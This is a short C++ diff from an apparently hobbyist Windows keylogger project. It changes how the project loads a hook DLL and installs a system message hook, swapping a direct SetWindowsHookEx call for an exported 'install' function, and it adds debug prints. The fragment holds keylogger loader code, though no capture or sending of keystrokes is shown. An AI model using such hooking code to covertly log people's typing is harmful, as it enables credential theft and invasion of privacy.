@@ -15,14 +15,25 @@ int _tmain(int argc, _TCHAR* argv[])
 
 void logKey() {
 	//while (true) {
-		HOOKPROC hkprcSysMsg;
 		static HINSTANCE hinstDLL;
 		static HHOOK hhookSysMsg;
 
-		hinstDLL = LoadLibrary(TEXT("C:\\Users\\Kodie Glosser\\Documents\\GitHub\\Keylogger\\HookDll\\Debug\\HookDll.dll"));
-		hkprcSysMsg = (HOOKPROC)GetProcAddress(hinstDLL, "SysMessageProc");
+		hinstDLL = LoadLibrary(_T("HookDll.dll"));
 
-		hhookSysMsg = SetWindowsHookEx(WH_SYSMSGFILTER, hkprcSysMsg, hinstDLL, 0);
+		if (hinstDLL == NULL)
+		{
+		  printf("null hinst");
+		  printf("cd C:\\Users\\Kodie Glosser\\Documents\\GitHub\\Keylogger\\HookDll\\Debug\\HookDll.dll");
+		  return;
+		} 
+
+		typedef void (*Install)();
+		Install install = (Install)GetProcAddress(hinstDLL, "install");
+
+		//hkprcSysMsg = (HOOKPROC)GetProcAddress(hinstDLL, "install");
+
+		//hhookSysMsg = SetWindowsHookEx(WH_SYSMSGFILTER, hkprcSysMsg, hinstDLL, 0);
+		install();
 		int i;
 		std::cout << hhookSysMsg << std::endl;
 		std::cin >> i;
